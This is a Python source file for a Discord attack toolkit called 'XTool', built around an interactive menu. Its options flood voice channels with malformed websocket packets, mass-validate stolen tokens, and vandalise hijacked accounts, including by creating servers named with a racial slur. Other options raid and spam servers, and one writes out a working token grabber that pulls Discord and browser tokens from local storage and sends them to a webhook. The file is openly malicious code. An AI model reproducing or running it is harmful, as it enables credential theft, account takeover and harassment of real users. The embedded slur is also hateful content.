import os
from selenium import webdriver
import requests
import json as js2,threading
import websocket
import asyncio
import getpass
import aiosonic
import names
import sys
import cfscrape
import time
import re
import threading
from threading import Thread
from tasksio import TaskPool
from colorama import init, Fore, Back, Style
from itertools import cycle
import random
from subprocess import call
import os.path
import ctypes

os.system('cls')

ctypes.windll.kernel32.SetConsoleTitleW("XTool")

banner = """
 ___  ___  ___________  ______      ______    ___       
|"  \/"  |("     _   ")/    " \    /    " \  |"  |      
 \   \  /  )__/  \\__/// ____  \  // ____  \ ||  |      
  \\  \/      \\_ /  /  /    ) :)/  /    ) :)|:  |      
  /\.  \      |.  | (: (____/ //(: (____/ //  \  |___   
 /  \   \     \:  |  \        /  \        /  ( \_|:  \  
|___/\___|     \__|   \"_____/    \"_____/    \_______) 
                                                        
"""

def deletewebhook(url):
	return requests.delete(url)


def vclag():
    while True:
        try:
            ws = websocket.create_connection(f"{ws_server}",origin=f"https://discord.com")
            ws.send(js2.dumps({"op":0,"d":{"server_id":f"{serverid}","user_id":f"{myuid}","session_id":f"{sessionid}","token":f"{tokenn}","video":True,"streams":[{"type":"video","rid":"100","quality":-1},{"type":"video","rid":"50","quality":9223372036854775807}]}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":12,"d":{"audio_ssrc":-1,"video_ssrc":-1,"rtx_ssrc":9223372036854775807,"streams":[{"type":"video","rid":"100","ssrc":-1,"active":True,"quality":9223372036854775807,"rtx_ssrc":9223372036854775807,"max_bitrate":9223372036854775807,"max_framerate":9223372036854775807,"max_resolution":{"type":"fixed","width":9223372036854775807,"height":9223372036854775807}}]}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":5,"d":{"speaking":9223372036854775807,"delay":-1,"ssrc":9223372036854775807}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":3,"d":-1},separators=(",", ":")).encode("UTF-8"))
            ws.close()
        except Exception as e:
            print(e)
            pass

threads = []

TOKENS_LOADED = 0
TOKENS_INVALID = 0
TOKENS_LOCKED = 0
TOKENS_VALID = 0
TOKENS_VALID_LIST = []


def filter_tokens(unfiltered):
    tokens = []
    
    for line in [x.strip() for x in unfiltered.readlines() if x.strip()]:
        for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
            for token in re.findall(regex, line):
                if token not in tokens:
                    tokens.append(token)
    return tokens

def title_worker():
    global TOKENS_INVALID, TOKENS_LOCKED, TOKENS_VALID, TOKENS_LOADED
    while True:
        time.sleep(0.1)


threading.Thread(target=title_worker, daemon=True).start()

async def check(token, client):
    global TOKENS_INVALID, TOKENS_LOCKED, TOKENS_VALID, TOKENS_VALID_LIST
    
    response = await client.get("https://discord.com/api/v9/users/@me/guild-events", headers={
        "Authorization": token,
        "Content-Type": "application/json"
    })
    
    if response.status_code == 200:
        TOKENS_VALID += 1
        TOKENS_VALID_LIST.append(token)
        print(f'{Fore.GREEN}[VALID] {token}')
            
    elif response.status_code == 401:      
        TOKENS_INVALID += 1
        print(f'{Fore.RED}[INVALID] {token}')
        
    elif response.status_code == 403:
        TOKENS_LOCKED += 1
        print(f'{Fore.LIGHTYELLOW_EX}[LOCKED] {token}')

def leave(guild_id, token):
    data = {"lurking": False}
    headers = {
        "Authorization":
        token,
        "accept":
        "*/*",
        "accept-language":
        "en-US",
        "connection":
        "keep-alive",
        "cookie":
        f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT":
        "1",
        "origin":
        "https://discord.com",
        "sec-fetch-dest":
        "empty",
        "sec-fetch-mode":
        "cors",
        "sec-fetch-site":
        "same-origin",
        "referer":
        "https://discord.com/channels/@me",
        "TE":
        "Trailers",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties":
        "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    requests.delete("https://discord.com/api/v9/users/@me/guilds/" + str(guild_id), json=data, headers=headers)

def rape(token):
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
    'Content-Type': 'application/json',
    'Authorization': token,
  }
    guild = {
    'channels': None,
    'icon': None,
    'name': "nigger",
    'region': "europe"
} 
    payload = {
    'message_display_compact': False,
    'inline_attachment_media': False,
    'inline_embed_media': False,
    'gif_auto_play': False,
    'theme': 'light',
    'render_embeds': False,
    'animate_emoji': False,
    'convert_emoticons': False,
    'locale': "zh-TW",
    'render_reactions': False,
    'enable_tts_command': False,
    'explicit_content_filter': '0',
    'status': "idle"
  }
    request = requests.Session()
    request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
    for i in range(21):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
async def maincheck():
    global TOKENS_INVALID, TOKENS_LOCKED, TOKENS_VALID, TOKENS_LOADED, TOKENS_VALID_LIST
    
    client = aiosonic.HTTPClient()
    
    try:
        with open('tokens.txt', 'r') as tokens:
            filtered = filter_tokens(tokens)
            TOKENS_LOADED = len(filtered)
            async with TaskPool(10_000) as pool:
                for token in filtered:
                    await pool.put(check(token, client))

            print(f"{Fore.WHITE}Tokens Loaded: {TOKENS_LOADED} | Valid: {TOKENS_VALID} | Locked: {TOKENS_LOCKED} | Invalid: {TOKENS_INVALID}")    
            
            with open(f'valid.txt', 'w') as handle:
                handle.write('\n'.join(TOKENS_VALID_LIST))
                handle.close()
                
            input("Saved to valid.txt, click enter to exit.")
                      
    except Exception as e:
        print(e)
        input('Can\'t open tokens.txt\nClick enter to exit!')

def sendMessage(message):
        request = requests.post(f'{api}channels/{channelId}/messages', json={'content': message}, headers=headersi)

def main():
    content = input('[Message To Send] -> ')

    sendMessage(content)

def randstr(lenn) :
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0,lenn): 
        text += alpha[random.randint(0,len(alpha)-1)]

    return text

pool_sema = threading.Semaphore(value=30)


def thread():
    channel_id = channel
    text = mess
    for token in tokens:
        time.sleep(int(delay))
        threading.Thread(target=spam, args=(token, channel_id, text)).start()


def join(invite, token):
    headers = {
        "Authorization":
        token,
        "accept":
        "*/*",
        "accept-language":
        "en-US",
        "connection":
        "keep-alive",
        "cookie":
        f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
        "DNT":
        "1",
        "origin":
        "https://discord.com",
        "sec-fetch-dest":
        "empty",
        "sec-fetch-mode":
        "cors",
        "sec-fetch-site":
        "same-origin",
        "referer":
        "https://discord.com/channels/@me",
        "TE":
        "Trailers",
        "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
        "X-Super-Properties":
        "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
    requests.post("https://discordapp.com/api/v9/invites/" + invite, headers=headers)

def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

user = getpass.getuser()
while True:
    print(banner)
    print(f"""\n{Fore.RED}[1]{Fore.RESET} Delete Webhook
{Fore.RED}[2]{Fore.RESET} VC Lagger
{Fore.RED}[3]{Fore.RESET} Fast Token Checker
{Fore.RED}[4]{Fore.RESET} Mass Report [Not Done]
{Fore.RED}[5]{Fore.RESET} Token rape
{Fore.RED}[6]{Fore.RESET} 2K Characters Bypass            
{Fore.RED}[7]{Fore.RESET} Block Bypass
{Fore.RED}[8]{Fore.RESET} Mass DM Friends
{Fore.RED}[9]{Fore.RESET} Token Grabber [Python]
{Fore.RED}[10]{Fore.RESET} Hypesquad Changer
{Fore.RED}[11]{Fore.RESET} Webhook Spammer
{Fore.RED}[12]{Fore.RESET} Token login
{Fore.RED}[13]{Fore.RESET} Raiding Tools
{Fore.RED}[14]{Fore.RESET} Token Information
{Fore.RED}[15]{Fore.RESET} Other Tools""")
    choice = input(">: ")
    if choice == '1':
        webhook = input("Webhook URL: ")
        deletewebhook(webhook)
    elif choice == '2':
        ws_server = input("Websocket: ")
        serverid = input("Server ID: ")
        myuid = input("Your ID: ")
        vid = input("Victim's ID (Anyone in the vc): ")
        sessionid = input("Session ID: ")
        tokenn = input("Token (not auth): ")
        for i in range(100):
            t = threading.Thread(target=vclag)
            t.daemon = True
            threads.append(t)
        for i in range(100):
            threads[i].start()
        for i in range(100):
            threads[i].join()
    elif choice == '3':
        loop = asyncio.get_event_loop()
        loop.run_until_complete(maincheck())
    elif choice == '4':
        input("Email: ")
        input("Subject: ")
        input("Description: ")
        input("Channel ID: ")
        input("Message Link: ")
    elif choice == "5":
        tokensa = input("Token: ")
        rape(tokensa)
    elif choice == "6":
        skata = input("Token: ")
        channel_id = input("Channel ID: ")
        chars = ''.join(random.choice('\'"^`|{}') for _ in range(1993))
        lmaoheader = {'Authorization': skata}
        requests.post(f'https://discordapp.com/api/v6/channels/{channel_id}/messages', headers=lmaoheader, json={'content': f'<a://a{chars}>'})
    elif choice == "7":
        api = 'https://discord.com/api/v8/'
        tokensat = input('Token -> ')
        userId = input('UserId to Message -> ')
        headersi = {
            'Authorization': tokensat,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
        }
        requesta = requests.post(f'{api}users/@me/channels', json={'recipients': [ userId ]}, headers=headersi)
        channelId = requesta.json()['id']
        main()
    elif choice == "8":
        bamba = input("Token: ")
        Message = input("Message: ")
        headersas = {'Authorization': bamba}
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(bamba)).json()
        for channel in channelIds:
            requests.post(f'https://discord.com/api/v9/channels/'+channel['id']+'/messages',
                data={"content": f"{Message}"})
    elif choice == "9":
        f = open("Grabber.py", "a")
        f.write("""import os
import re
import json

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = ''

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\\\Local Storage\\\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', r'mfa\\.[\\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\\\Discord',
        'Discord Canary': roaming + '\\\\discordcanary',
        'Discord PTB': roaming + '\\\\discordptb',
        'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',
        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',
        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\\n**{platform}**\\n```\\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}'
        else:
            message += 'No tokens found.'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()""")
        f.close()
    elif choice == "10":
        hypetoken = input("Token: ")
        print("1 - Bravery\n2 - Brilliance\n3 - Balance")
        hypesquad = input("Choice: ")

        headersosat = {
        'Authorization': str(hypetoken)
        }

        payloadsosat = {
    'house_id': str(hypesquad)
        }

        rep = requests.session().post("https://discord.com/api/v8/hypesquad/online", json=payloadsosat, headers=headersosat)
    elif choice == "11":
        actual = input("Webhook URL: ")
        msg = input("Message: ")
        for x in range(2):
            sendwebhook = requests.post(actual, json={'content': msg})
    elif choice == "12":
        tokenbat = input("Token: ")
        driver = webdriver.Chrome('./utilities/chromedriver.exe')
        driver.get('https://discord.com/login')
        js = 'function login(token) {setInterval(() => {document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`}, 50);setTimeout(() => {location.reload();}, 500);}'
        time.sleep(3)
        driver.execute_script(js + f'login("{tokenbat}")')
    elif choice == "13":
        print(f"""{Fore.RED}[1]{Fore.RESET} Joiner
{Fore.RED}[2]{Fore.RESET} Leaver
{Fore.RED}[3]{Fore.RESET} Spammer""")
        rais = input("Choice: ")
        if rais == "1":
            invite = input('Invite: ')
            invite = invite.replace("https://discord.gg/", "")
            invite = invite.replace("https://discord.com/invite/", "")
            invite = invite.replace("discord.gg/", "")
            tokens = open("tokens.txt", "r").read().splitlines()
            for token in tokens:
                threading.Thread(target=join, args=(invite, token)).start()
        elif rais == "2":
                tokens = open("tokens.txt", "r").read().splitlines()
                guild_id = input('Server ID: ')
                for token in tokens:
                    threading.Thread(target=leave, args=(guild_id, token)).start()
        elif rais == "3":
            channel = input(f'[{Fore.LIGHTGREEN_EX}X{Fore.RESET}] Channel ID: ')
            mess = input(f'[{Fore.LIGHTGREEN_EX}X{Fore.RESET}] Message: ')
            delay = input(f'[{Fore.LIGHTGREEN_EX}X{Fore.RESET}] Delay (0 - 0.5 reccomended): ')
            tokens = open("tokens.txt", "r").read().splitlines()

            def spam(token, channel, mess):
                url = 'https://discord.com/api/v9/channels/'+channel+'/messages'
                data = {"content": mess}
                header = {"authorization": token}

                
                while True:
                    time.sleep(int(delay))
                    r = requests.post(url, data=data, headers=header)

            for x in range(150):
                for token in tokens:
                    channel_id = channel
                    text = mess
                    time.sleep(int(delay))
                    threading.Thread(target=spam, args=(token, channel_id, text)).start()
    elif choice == "14":
        exec(open('utilities/tokenf.py').read())
    elif choice == "15":
        print(f'''
{Fore.RED}#SELFBOTS{Fore.RESET}
[1] Exeter
[2] Nighty


{Fore.RED}#Tools{Fore.RESET}
[3] AstraaHome
[4] Crowntool

{Fore.RED}#Nukers{Fore.RESET}
[5] HazardNuker
[6] AveryNuker
''')
        tool = input("Choice: ")
        if tool == "1":
            token = input("Token: ")
            with open('config.json', 'w') as f:
                f.write('''{
    "token": "%s",
    "password": "",
    "prefix": ">",
    "nitro_sniper": false
}
''' % (token))
            time.sleep(1)
            call(["python", "utilities/selfbots/exeter/exeter.py"])
        elif tool == "2":
            token = input("Token: ")
            with open('utilities/selfbots/nighty/config.json', 'w') as f:
                f.write('''{
  "token": "%s",
  "prefix": ".",
  "deletetimer": 40,
  "errorlog": "Error!"
}
''' % (token))
            time.sleep(1)
            os.startfile(os.getcwd() + '/utilities/selfbots/nighty/Nighty.exe')
        elif tool == "3":
            call(["python", "utilities/other/Astraahome/astraahome.py"])
        elif tool == "4":
            os.startfile(os.getcwd() + '/utilities/other/Crowntool/crowntool.exe')
        elif tool == "5":
            os.startfile(os.getcwd() + '/utilities/nukers/HazardNuker/hazard.exe')
        elif tool == "6":
            os.startfile(os.getcwd() + '/utilities/nukers/AveryNuker/avery.exe')
    os.system('cls')